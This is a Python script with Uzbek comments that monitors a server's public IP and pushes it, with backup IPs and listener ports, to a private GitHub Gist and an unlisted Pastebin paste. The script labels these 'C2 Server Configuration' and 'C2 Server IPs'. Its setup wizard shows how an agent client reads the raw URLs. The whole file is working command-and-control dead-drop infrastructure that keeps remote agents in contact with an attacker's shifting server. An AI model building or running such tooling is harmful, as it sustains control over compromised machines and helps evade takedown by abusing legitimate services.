"""
Auto IP Manager - Server IP ni avtomatik olish va upload qilish
Serverda ishga tushiriladi, IP o'zgarsa avtomatik yangilaydi
"""
import urllib.request
import urllib.parse
import urllib.error
import json
import time
import os
from datetime import datetime


class PublicIPDetector:
    """Public IP ni aniqlash"""
    
    # Public IP detection services
    IP_SERVICES = [
        'https://api.ipify.org',
        'https://ifconfig.me/ip',
        'https://icanhazip.com',
        'https://ident.me',
        'https://ipecho.net/plain',
        'https://api.my-ip.io/ip',
        'https://checkip.amazonaws.com'
    ]
    
    @classmethod
    def get_public_ip(cls, timeout=5):
        """Public IP ni olish
        
        Returns:
            str: Public IP manzil
        """
        for service in cls.IP_SERVICES:
            try:
                req = urllib.request.Request(
                    service,
                    headers={'User-Agent': 'Mozilla/5.0'}
                )
                
                with urllib.request.urlopen(req, timeout=timeout) as response:
                    ip = response.read().decode('utf-8').strip()
                    
                # IP format tekshirish
                if cls._is_valid_ip(ip):
                    return ip
                    
            except Exception as e:
                continue
                
        raise Exception("Public IP ni olib bo'lmadi!")
        
    @staticmethod
    def _is_valid_ip(ip):
        """IP format to'g'riligini tekshirish"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            return all(0 <= int(part) <= 255 for part in parts)
        except:
            return False


class GitHubGistUploader:
    """GitHub Gist ga avtomatik upload"""
    
    def __init__(self, token, gist_id=None):
        """
        Args:
            token: GitHub Personal Access Token
            gist_id: Mavjud gist ID (update uchun), None = yangi gist
        """
        self.token = token
        self.gist_id = gist_id
        self.api_url = 'https://api.github.com/gists'
        
    def upload_config(self, server_ip, backup_ips=None, ports=None):
        """Config ni GitHub Gist ga upload qilish
        
        Args:
            server_ip: Primary server IP
            backup_ips: Backup IP list
            ports: Port dictionary {protocol: port}
            
        Returns:
            str: Gist URL
        """
        # Config yaratish
        config = {
            'server_ip': server_ip,
            'backup_ips': backup_ips or [],
            'ports': ports or {
                'tcp': 9999,
                'http': 8080,
                'https': 8443,
                'websocket': 8765
            },
            'updated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'timestamp': int(time.time())
        }
        
        # Gist data
        gist_data = {
            'description': 'C2 Server Configuration - Auto Updated',
            'public': False,  # Private gist
            'files': {
                'server_config.json': {
                    'content': json.dumps(config, indent=2)
                }
            }
        }
        
        # Request
        headers = {
            'Authorization': f'token {self.token}',
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json'
        }
        
        try:
            if self.gist_id:
                # Update existing gist
                url = f'{self.api_url}/{self.gist_id}'
                method = 'PATCH'
            else:
                # Create new gist
                url = self.api_url
                method = 'POST'
                
            req = urllib.request.Request(
                url,
                data=json.dumps(gist_data).encode('utf-8'),
                headers=headers,
                method=method
            )
            
            with urllib.request.urlopen(req) as response:
                result = json.loads(response.read().decode('utf-8'))
                
                # Gist ID ni saqlash
                if not self.gist_id:
                    self.gist_id = result['id']
                    
                # Raw URL
                raw_url = result['files']['server_config.json']['raw_url']
                
                return {
                    'success': True,
                    'gist_id': self.gist_id,
                    'gist_url': result['html_url'],
                    'raw_url': raw_url
                }
                
        except urllib.error.HTTPError as e:
            error_msg = e.read().decode('utf-8')
            return {
                'success': False,
                'error': f'HTTP Error: {e.code} - {error_msg}'
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }


class PastebinUploader:
    """Pastebin ga avtomatik upload"""
    
    def __init__(self, api_key):
        """
        Args:
            api_key: Pastebin API key
        """
        self.api_key = api_key
        self.api_url = 'https://pastebin.com/api/api_post.php'
        
    def upload_ips(self, server_ip, backup_ips=None):
        """IP larni Pastebin ga upload qilish
        
        Args:
            server_ip: Primary IP
            backup_ips: Backup IP list
            
        Returns:
            dict: Result with paste URL
        """
        # IP list yaratish
        ip_list = [server_ip]
        if backup_ips:
            ip_list.extend(backup_ips)
            
        content = '\n'.join(ip_list)
        content += f'\n\n# Updated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
        
        # Pastebin data
        data = {
            'api_dev_key': self.api_key,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_name': 'C2 Server IPs - Auto Updated',
            'api_paste_private': '1',  # 0=public, 1=unlisted, 2=private
            'api_paste_expire_date': 'N'  # Never expire
        }
        
        try:
            req = urllib.request.Request(
                self.api_url,
                data=urllib.parse.urlencode(data).encode('utf-8')
            )
            
            with urllib.request.urlopen(req) as response:
                paste_url = response.read().decode('utf-8')
                
                if paste_url.startswith('http'):
                    # Raw URL
                    paste_key = paste_url.split('/')[-1]
                    raw_url = f'https://pastebin.com/raw/{paste_key}'
                    
                    return {
                        'success': True,
                        'paste_url': paste_url,
                        'raw_url': raw_url
                    }
                else:
                    return {
                        'success': False,
                        'error': paste_url
                    }
                    
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }


class AutoIPManager:
    """Avtomatik IP monitoring va upload"""
    
    def __init__(self, config_file='ip_config.json'):
        """
        Args:
            config_file: Config fayl nomi
        """
        self.config_file = config_file
        self.current_ip = None
        self.github_uploader = None
        self.pastebin_uploader = None
        
        # Settings
        self.check_interval = 300  # 5 daqiqa
        self.backup_ips = []
        self.ports = {}
        
        # Load config
        self.load_config()
        
    def load_config(self):
        """Config faylni yuklash"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    
                self.current_ip = config.get('current_ip')
                self.backup_ips = config.get('backup_ips', [])
                self.ports = config.get('ports', {})
                
                # GitHub config
                github_token = config.get('github_token')
                github_gist_id = config.get('github_gist_id')
                if github_token:
                    self.github_uploader = GitHubGistUploader(github_token, github_gist_id)
                    
                # Pastebin config
                pastebin_key = config.get('pastebin_api_key')
                if pastebin_key:
                    self.pastebin_uploader = PastebinUploader(pastebin_key)
                    
            except Exception as e:
                print(f"⚠️ Config yuklashda xato: {e}")
                
    def save_config(self):
        """Config faylni saqlash"""
        config = {
            'current_ip': self.current_ip,
            'backup_ips': self.backup_ips,
            'ports': self.ports,
            'github_token': self.github_uploader.token if self.github_uploader else None,
            'github_gist_id': self.github_uploader.gist_id if self.github_uploader else None,
            'pastebin_api_key': self.pastebin_uploader.api_key if self.pastebin_uploader else None,
            'last_updated': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, indent=2, fp=f)
        except Exception as e:
            print(f"❌ Config saqlashda xato: {e}")
            
    def setup_github(self, token, gist_id=None):
        """GitHub Gist ni sozlash"""
        self.github_uploader = GitHubGistUploader(token, gist_id)
        self.save_config()
        print("✅ GitHub Gist sozlandi")
        
    def setup_pastebin(self, api_key):
        """Pastebin ni sozlash"""
        self.pastebin_uploader = PastebinUploader(api_key)
        self.save_config()
        print("✅ Pastebin sozlandi")
        
    def detect_ip_change(self):
        """IP o'zgarganini tekshirish
        
        Returns:
            tuple: (changed, new_ip)
        """
        try:
            new_ip = PublicIPDetector.get_public_ip()
            
            if new_ip != self.current_ip:
                return True, new_ip
            else:
                return False, new_ip
                
        except Exception as e:
            print(f"❌ IP tekshirishda xato: {e}")
            return False, None
            
    def update_ip(self, new_ip):
        """Yangi IP ni upload qilish"""
        print(f"\n🔄 IP o'zgardi: {self.current_ip} → {new_ip}")
        
        self.current_ip = new_ip
        results = []
        
        # GitHub Gist upload
        if self.github_uploader:
            print("📤 GitHub Gist ga yuklanmoqda...")
            result = self.github_uploader.upload_config(
                new_ip,
                self.backup_ips,
                self.ports
            )
            
            if result['success']:
                print(f"✅ GitHub Gist yangilandi!")
                print(f"   Gist URL: {result['gist_url']}")
                print(f"   Raw URL: {result['raw_url']}")
                results.append(('github', result))
            else:
                print(f"❌ GitHub Gist xatosi: {result['error']}")
                
        # Pastebin upload
        if self.pastebin_uploader:
            print("📤 Pastebin ga yuklanmoqda...")
            result = self.pastebin_uploader.upload_ips(new_ip, self.backup_ips)
            
            if result['success']:
                print(f"✅ Pastebin yangilandi!")
                print(f"   Paste URL: {result['paste_url']}")
                print(f"   Raw URL: {result['raw_url']}")
                results.append(('pastebin', result))
            else:
                print(f"❌ Pastebin xatosi: {result['error']}")
                
        # Config saqlash
        self.save_config()
        
        return results
        
    def monitor(self):
        """IP ni doimiy monitoring qilish"""
        print("="*60)
        print("🚀 AUTO IP MANAGER")
        print("="*60)
        print(f"\n⚙️ Settings:")
        print(f"   Check interval: {self.check_interval} sekund ({self.check_interval//60} daqiqa)")
        print(f"   GitHub Gist: {'✅ Yoqilgan' if self.github_uploader else '❌ O\\'chirilgan'}")
        print(f"   Pastebin: {'✅ Yoqilgan' if self.pastebin_uploader else '❌ O\\'chirilgan'}")
        print(f"\n📍 Current IP: {self.current_ip or 'Noma\\'lum'}")
        print("\n🔍 Monitoring boshlandi...\n")
        
        iteration = 0
        
        while True:
            try:
                iteration += 1
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                # IP tekshirish
                changed, new_ip = self.detect_ip_change()
                
                if changed and new_ip:
                    print(f"\n[{timestamp}] ⚠️ IP O'ZGARDI!")
                    self.update_ip(new_ip)
                else:
                    print(f"[{timestamp}] ✓ IP o'zgarmagan: {self.current_ip}")
                    
                # Next check
                print(f"   Keyingi tekshiruv: {self.check_interval} sekunddan keyin...")
                time.sleep(self.check_interval)
                
            except KeyboardInterrupt:
                print("\n\n🛑 Monitoring to'xtatildi")
                break
            except Exception as e:
                print(f"\n❌ Xato: {e}")
                print(f"   {self.check_interval} sekunddan keyin qayta uriniladi...")
                time.sleep(self.check_interval)


def setup_wizard():
    """Setup wizard - foydalanuvchi uchun"""
    print("="*60)
    print("🔧 AUTO IP MANAGER - SETUP")
    print("="*60)
    print()
    
    manager = AutoIPManager()
    
    # Current IP
    print("📍 Hozirgi IP ni aniqlash...")
    try:
        current_ip = PublicIPDetector.get_public_ip()
        print(f"✅ Public IP: {current_ip}\n")
        manager.current_ip = current_ip
    except Exception as e:
        print(f"❌ Xato: {e}\n")
        return
        
    # Ports
    print("📋 Portlarni kiriting (default: Enter):")
    ports = {}
    
    default_ports = {
        'tcp': 9999,
        'http': 8080,
        'https': 8443,
        'websocket': 8765
    }
    
    for protocol, default in default_ports.items():
        port = input(f"   {protocol.upper()} port [{default}]: ").strip()
        ports[protocol] = int(port) if port else default
        
    manager.ports = ports
    print()
    
    # Backup IPs
    print("📋 Backup IP lar (har satrda 1ta, tugash: Enter):")
    backup_ips = []
    while True:
        ip = input("   Backup IP: ").strip()
        if not ip:
            break
        backup_ips.append(ip)
        
    manager.backup_ips = backup_ips
    print()
    
    # GitHub Gist
    print("📝 GitHub Gist setup:")
    github_choice = input("   GitHub Gist ishlatilsinmi? [y/N]: ").strip().lower()
    
    if github_choice == 'y':
        print("\n   📖 GitHub Personal Access Token olish:")
        print("      1. https://github.com/settings/tokens ga kiring")
        print("      2. 'Generate new token (classic)' ni bosing")
        print("      3. 'gist' permission ni tanlang")
        print("      4. Token ni nusxalang\n")
        
        token = input("   Token: ").strip()
        gist_id = input("   Mavjud Gist ID (yangi: Enter): ").strip() or None
        
        if token:
            manager.setup_github(token, gist_id)
            
            # Test upload
            print("\n   🧪 Test upload...")
            result = manager.github_uploader.upload_config(
                current_ip, backup_ips, ports
            )
            
            if result['success']:
                print(f"\n   ✅ SUCCESS!")
                print(f"   Gist URL: {result['gist_url']}")
                print(f"   Raw URL: {result['raw_url']}")
                print(f"\n   📋 Agent'da ishlatish:")
                print(f"   client.add_ip_update_source('github_gist',")
                print(f"       '{result['raw_url']}')")
            else:
                print(f"\n   ❌ Xato: {result['error']}")
    print()
    
    # Pastebin
    print("📋 Pastebin setup:")
    pastebin_choice = input("   Pastebin ishlatilsinmi? [y/N]: ").strip().lower()
    
    if pastebin_choice == 'y':
        print("\n   📖 Pastebin API Key olish:")
        print("      1. https://pastebin.com/doc_api ga kiring")
        print("      2. 'Your Unique Developer API Key' ni nusxalang\n")
        
        api_key = input("   API Key: ").strip()
        
        if api_key:
            manager.setup_pastebin(api_key)
            
            # Test upload
            print("\n   🧪 Test upload...")
            result = manager.pastebin_uploader.upload_ips(current_ip, backup_ips)
            
            if result['success']:
                print(f"\n   ✅ SUCCESS!")
                print(f"   Paste URL: {result['paste_url']}")
                print(f"   Raw URL: {result['raw_url']}")
                print(f"\n   📋 Agent'da ishlatish:")
                print(f"   client.add_ip_update_source('pastebin',")
                print(f"       '{result['raw_url']}')")
            else:
                print(f"\n   ❌ Xato: {result['error']}")
    print()
    
    # Check interval
    print("⏱️ Check interval:")
    interval = input("   Necha daqiqada tekshirish? [5]: ").strip()
    manager.check_interval = int(interval) * 60 if interval else 300
    print()
    
    # Save
    manager.save_config()
    print("💾 Config saqlandi: ip_config.json\n")
    
    # Start monitoring
    print("="*60)
    start = input("Monitoring boshlashmi? [Y/n]: ").strip().lower()
    
    if start != 'n':
        print()
        manager.monitor()
    else:
        print("\n✅ Setup tugadi!")
        print("\nMonitoring boshlash:")
        print("   python common/auto_ip_manager.py")


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'setup':
        # Setup wizard
        setup_wizard()
    elif len(sys.argv) > 1 and sys.argv[1] == 'check':
        # Bir marta IP tekshirish
        print("📍 Public IP ni aniqlash...\n")
        try:
            ip = PublicIPDetector.get_public_ip()
            print(f"✅ Sizning public IP: {ip}")
        except Exception as e:
            print(f"❌ Xato: {e}")
    elif os.path.exists('ip_config.json'):
        # Config mavjud - monitoring
        manager = AutoIPManager()
        manager.monitor()
    else:
        # Setup kerak
        print("⚠️ Config topilmadi!\n")
        print("Setup boshlash:")
        print("   python common/auto_ip_manager.py setup\n")
        print("IP tekshirish:")
        print("   python common/auto_ip_manager.py check")
